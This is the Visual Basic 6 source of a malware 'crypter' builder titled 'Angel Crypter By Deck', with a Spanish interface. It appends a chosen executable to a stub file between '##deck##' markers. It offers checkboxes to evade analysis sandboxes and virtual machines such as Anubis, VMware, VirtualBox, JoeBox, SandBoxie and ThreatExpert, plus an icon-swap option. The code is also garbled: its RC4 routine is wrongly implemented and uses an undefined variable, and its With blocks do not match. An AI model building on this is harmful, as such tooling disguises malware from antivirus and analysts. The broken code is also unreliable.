VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form Crypter 
   Caption         =   "Angel Crypter By Deck"
   ClientHeight    =   6300
   ClientLeft      =   60
   ClientTop       =   435
   ClientWidth     =   5625
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   Picture         =   "Form1.frx":0000
   ScaleHeight     =   6300
   ScaleWidth      =   5625
   StartUpPosition =   3  'Windows Default
   Begin VB.CheckBox cAnubis 
      BackColor       =   &H80000004&
      Caption         =   "Anti Anubis"
      Height          =   255
      Left            =   2640
      TabIndex        =   13
      Top             =   2040
      Width           =   2895
   End
   Begin VB.CheckBox cVM 
      Caption         =   "Anti VMware"
      Height          =   255
      Left            =   2640
      TabIndex        =   12
      Top             =   2280
      Width           =   2895
   End
   Begin VB.CheckBox cVirtualBox 
      Caption         =   "Anti VirtualBox"
      Height          =   255
      Left            =   2640
      TabIndex        =   11
      Top             =   2520
      Width           =   2895
   End
   Begin VB.CheckBox cVirtualPC 
      Caption         =   "Anti VirtualPC"
      Height          =   255
      Left            =   2640
      TabIndex        =   10
      Top             =   2760
      Width           =   2895
   End
   Begin VB.CheckBox cSandbox 
      Caption         =   "Anti CWSandbox"
      Height          =   255
      Left            =   2640
      TabIndex        =   9
      Top             =   3000
      Width           =   2895
   End
   Begin VB.CheckBox cJoebox 
      Caption         =   "Anti JoeBox"
      Height          =   255
      Left            =   2640
      MaskColor       =   &H00FFFFFF&
      TabIndex        =   8
      Top             =   3240
      Width           =   2895
   End
   Begin VB.CheckBox cSandBoxie 
      Caption         =   "Anti SandBoxie"
      Height          =   255
      Left            =   2640
      TabIndex        =   7
      Top             =   3480
      Width           =   2895
   End
   Begin VB.CheckBox cThreatExpert 
      Caption         =   "Anti ThreatExpert"
      Height          =   255
      Left            =   2640
      TabIndex        =   6
      Top             =   3720
      Width           =   2895
   End
   Begin VB.PictureBox iPic 
      Height          =   615
      Left            =   120
      ScaleHeight     =   555
      ScaleWidth      =   555
      TabIndex        =   5
      Top             =   2760
      Width           =   615
   End
   Begin VB.CheckBox deckicono 
      Caption         =   "Cambiar Icono"
      Height          =   255
      Left            =   0
      TabIndex        =   4
      Top             =   3600
      Width           =   1335
   End
   Begin MSComDlg.CommonDialog CD 
      Left            =   0
      Top             =   5880
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.TextBox deck2 
      Height          =   285
      Left            =   1200
      TabIndex        =   3
      Text            =   "Selecione Archivo A Encryptar"
      Top             =   720
      Width           =   2535
   End
   Begin VB.CommandButton deckIcon 
      Caption         =   "Cambiar Icono"
      Height          =   255
      Left            =   840
      TabIndex        =   2
      Top             =   2880
      Width           =   1455
   End
   Begin VB.CommandButton deck1 
      Caption         =   "Encryptar"
      Height          =   255
      Left            =   1920
      TabIndex        =   1
      Top             =   1320
      Width           =   1455
   End
   Begin VB.CommandButton deck 
      Caption         =   "..."
      Height          =   255
      Left            =   3960
      TabIndex        =   0
      Top             =   720
      Width           =   735
   End
End
Attribute VB_Name = "Crypter"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False


Private Sub deck_Click()



With CD
        .DialogTitle = "Seleccione el archivo a encriptar!"
        .Filter = "Aplicaciones EXE|*.exe"
        .ShowOpen
        End With
        
        If Not CD.FileName = vbNullString Then
        deck2.Text = CD.FileName
        MsgBox "Archivo cargado correctamente!", vbInformation, Me.Caption
        Else
        MsgBox "Error No Se Cargo El Archivo A Encriptar", vbCritical, Me.Caption
        End If
End Sub

Private Sub deck1_Click()
Dim Stub As String, Archivo As String



If deck2.Text = vbNullString Then
MsgBox "Primero debe cargar un archivo para encriptar!", vbExclamation, Me.Caption
Exit Sub
Else

Open App.Path & "\Stub.exe" For Binary As #1
Stub = Space(LOF(1))
Get #1, , Stub
Close #1

Open deck2.Text For Binary As #1
Archivo = Space(LOF(1))
Get #1, , Archivo
Close #1


With CD
        .DialogTitle = "Selecione la ruta donde guardar el archivo encriptado!"
        .Filter = "Aplicaciones EXE|*.exe"
        .ShowSave
        End With
        
        If Not CD.FileName = vbNullString Then
        
        
        
        Open CD.FileName For Binary As #1
        Put #1, , Stub & "##deck##" & Archivo & "##deck##"
        Close #1
        
        MsgBox "Archivo Encriptado Correctamente!", vbInformation, Me.Caption
        End If
        If deckicono.Value = 1 Then
Call ReplaceIcons(Archivo.Text, Archivo.Text, vbNullString)
MsgBox "Icono cambiado", vbInformation, Me.Caption
Else
MsgBox "Escoje un archivo y icono", vbInformation, Me.Caption
If .FileName <> "" Then iPic.Picture = LoadPicture(.FileName): pRuta = .FileName
 End With
End If
End Sub


Public Function RC4(ByVal Data As String, ByVal Password As String) As String
On Error Resume Next
Dim F(0 To 255) As Integer, x, Y As Long, Key() As Byte
Key() = StrConv(Password, vbFromUnicode)
For x = 0 To 255
    Y = (Y + F(x) + Key(x Mod Len(Password))) Mod 256
    F(x) = x
Next x
Key() = StrConv(Data, vbFromUnicode)
For x = 0 To Len(Data)
    Y = (Y + F(Y) + 1) Mod 256
    Key(x) = Key(x) Xor F(Temp + F((Y + F(Y)) Mod 254))
Next x
RC4 = StrConv(Key, vbUnicode)
End Function

Private Sub deckIcon_Click()
With CD
        .DialogTitle = "Selecciona tu icono"
        .Filter = ".ico|*.ico"
        .ShowOpen
         End With

If Not CD.FileName = vbNullString Then
Archivo.Text = CD.FileName

    MsgBox "icono Cargado Correctamente", vbInformation, Me.Caption
Else
    MsgBox "Error No Se Cargo El icono", vbCritical, Me.Caption
   End If
End Sub

